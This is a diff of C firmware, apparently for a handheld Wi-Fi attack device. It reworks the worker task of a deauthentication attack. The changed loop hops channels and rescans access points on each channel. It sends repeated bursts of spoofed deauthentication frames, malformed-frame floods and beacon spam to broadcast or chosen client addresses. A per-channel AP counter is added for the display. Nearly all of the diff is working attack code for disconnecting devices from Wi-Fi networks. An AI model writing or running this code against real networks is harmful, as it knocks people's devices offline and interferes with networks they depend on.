@@ -51,6 +51,9 @@ static uint8_t s_unicast_macs[WLAN_APP_MAX_DEAUTH_CLIENTS][6];
 static uint8_t s_unicast_count = 0;
 static uint8_t s_ch_bssids[DEAUTH_CH_MAX_APS][6];
 static uint8_t s_ch_bssid_count = 0;
+/* Live per-channel AP count, written by the worker as it scans each channel.
+ * The smart-deauth view reads this so its boxes reflect the real attack. */
+volatile uint8_t s_ch_ap_count[14] = {0};
 static int8_t s_ch_scanned_channel = -1;
 static uint32_t s_ch_scanned_at_ms = 0;
 
@@ -148,6 +151,7 @@ static void deauth_scan_channel_aps(uint8_t channel) {
 
     s_ch_scanned_channel = channel;
     s_ch_scanned_at_ms = now;
+    if (channel < 14) s_ch_ap_count[channel] = s_ch_bssid_count;
 }
 
 uint8_t deauth_get_most_active_channels(uint8_t* channels, uint8_t max_count) {
@@ -184,81 +188,64 @@ uint8_t deauth_get_most_active_channels(uint8_t* channels, uint8_t max_count) {
 
 static void IRAM_ATTR deauth_task_fn(void* arg) {
     WlanApp* app = (WlanApp*)arg;
-    uint32_t cycle = 0;
+    (void)app; /* TX mix is identical for smart/normal; smart just hops channels */
 
     if (wlan_hal_is_connected()) wlan_hal_disconnect();
 
-    if (s_use_channel_mode) {
-        deauth_scan_channel_aps(s_target_channel);
-        if (s_ch_bssid_count == 0) {
-            wlan_hal_set_promiscuous(true, NULL);
-            s_status = DeauthStatusNoApsOnChannel;
-            goto task_end;
-        }
-    }
+    /* Forces an initial tune + per-channel scan on the first loop iteration
+     * when in channel mode. In single-BSSID/unicast mode we tune just once. */
+    int8_t worker_channel = -1;
 
-    wlan_hal_set_channel(s_target_channel);
-    wlan_hal_set_promiscuous(true, NULL);
+    if (!s_use_channel_mode) {
+        wlan_hal_set_channel(s_target_channel);
+        wlan_hal_set_promiscuous(true, NULL);
+    }
     s_status = DeauthStatusRunning;
 
     memcpy(deauth_pkt, deauth_tmpl, 26);
 
     while (s_task_run) {
-        if (app->deauth_smart) {
-            if (s_use_channel_mode) {
-                for (uint8_t i = 0; i < s_ch_bssid_count; i++) {
-                    for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
-                        deauth_tx_pair_fast(broadcast_mac, s_ch_bssids[i]);
-                        deauth_tx_malformed_flood(broadcast_mac, s_ch_bssids[i]);
-                        deauth_tx_beacon_spam(s_ch_bssids[i]);
-                    }
-                }
-            } else if (s_unicast_count > 0) {
-                for (uint8_t i = 0; i < s_unicast_count; i++) {
-                    for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
-                        deauth_tx_pair_fast(s_unicast_macs[i], s_target_bssid);
-                        deauth_tx_malformed_flood(s_unicast_macs[i], s_target_bssid);
-                        deauth_tx_beacon_spam(s_target_bssid);
-                    }
-                }
-            } else {
+        if (s_use_channel_mode) {
+            /* The scene rotates s_target_channel across the active channels.
+             * Whenever it changes, the WORKER (sole owner of the radio) must
+             * both re-tune AND re-scan that channel's BSSIDs — otherwise it
+             * keeps blasting the previous channel's APs on the wrong channel,
+             * which is silently ineffective. deauth_scan_channel_aps caches
+             * per channel, so re-hopping within the TTL is cheap. */
+            if ((int8_t)s_target_channel != worker_channel) {
+                worker_channel = (int8_t)s_target_channel;
+                deauth_scan_channel_aps(worker_channel); /* promisc off + scan + cache */
+                wlan_hal_set_channel(worker_channel);
+                wlan_hal_set_promiscuous(true, NULL);
+                s_status = (s_ch_bssid_count > 0) ? DeauthStatusRunning
+                                                  : DeauthStatusNoApsOnChannel;
+            }
+            for (uint8_t i = 0; i < s_ch_bssid_count; i++) {
                 for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
-                    deauth_tx_pair_fast(broadcast_mac, s_target_bssid);
-                    deauth_tx_malformed_flood(broadcast_mac, s_target_bssid);
+                    deauth_tx_pair_fast(broadcast_mac, s_ch_bssids[i]);
+                    deauth_tx_malformed_flood(broadcast_mac, s_ch_bssids[i]);
+                    deauth_tx_beacon_spam(s_ch_bssids[i]);
+                }
+            }
+        } else if (s_unicast_count > 0) {
+            for (uint8_t i = 0; i < s_unicast_count; i++) {
+                for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
+                    deauth_tx_pair_fast(s_unicast_macs[i], s_target_bssid);
+                    deauth_tx_malformed_flood(s_unicast_macs[i], s_target_bssid);
                     deauth_tx_beacon_spam(s_target_bssid);
                 }
             }
         } else {
-            if (s_use_channel_mode) {
-                for (uint8_t i = 0; i < s_ch_bssid_count; i++) {
-                    for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
-                        deauth_tx_pair_fast(broadcast_mac, s_ch_bssids[i]);
-                        deauth_tx_malformed_flood(broadcast_mac, s_ch_bssids[i]);
-                        deauth_tx_beacon_spam(s_ch_bssids[i]);
-                    }
-                }
-            } else if (s_unicast_count > 0) {
-                for (uint8_t i = 0; i < s_unicast_count; i++) {
-                    for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
-                        deauth_tx_pair_fast(s_unicast_macs[i], s_target_bssid);
-                        deauth_tx_malformed_flood(s_unicast_macs[i], s_target_bssid);
-                        deauth_tx_beacon_spam(s_target_bssid);
-                    }
-                }
-            } else {
-                for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
-                    deauth_tx_pair_fast(broadcast_mac, s_target_bssid);
-                    deauth_tx_malformed_flood(broadcast_mac, s_target_bssid);
-                    deauth_tx_beacon_spam(s_target_bssid);
-                }
+            for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
+                deauth_tx_pair_fast(broadcast_mac, s_target_bssid);
+                deauth_tx_malformed_flood(broadcast_mac, s_target_bssid);
+                deauth_tx_beacon_spam(s_target_bssid);
             }
         }
 
-        cycle++;
         vTaskDelay(0);
     }
 
-task_end:
     s_status = DeauthStatusIdle;
     s_task = NULL;
     vTaskDelete(NULL);
